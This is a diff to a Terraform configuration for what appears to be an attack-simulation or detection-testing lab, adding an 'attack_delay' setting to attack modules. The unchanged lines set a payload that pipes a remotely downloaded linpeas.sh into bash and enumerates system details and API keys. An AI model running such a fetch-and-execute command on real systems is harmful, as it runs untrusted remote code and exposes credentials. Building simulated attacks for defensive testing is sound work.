@@ -123,6 +123,7 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                attack_delay                = number
               })
               docker_log4shell_attack = object({
                 enabled                     = bool
@@ -330,6 +331,7 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                attack_delay                = number
               })
               docker_log4shell_attack = object({
                 enabled                     = bool
@@ -562,6 +564,7 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                attack_delay                = number
               })
               docker_log4shell_attack = object({
                 enabled                     = bool
@@ -819,6 +822,7 @@ variable "config" {
                 target_ip                   = null
                 target_port                 = 8089
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                attack_delay                = 50400
               }
               docker_log4shell_attack = {
                 enabled                     = false
@@ -1035,6 +1039,7 @@ variable "config" {
                 target_ip                   = null
                 target_port                 = 8089
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                attack_delay                = 50400
               }
               docker_log4shell_attack = {
                 enabled                     = false
@@ -1276,6 +1281,7 @@ variable "config" {
                 target_ip                   = null
                 target_port                 = 8089
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                attack_delay                = 50400
               }
               docker_log4shell_attack = {
                 enabled                     = false
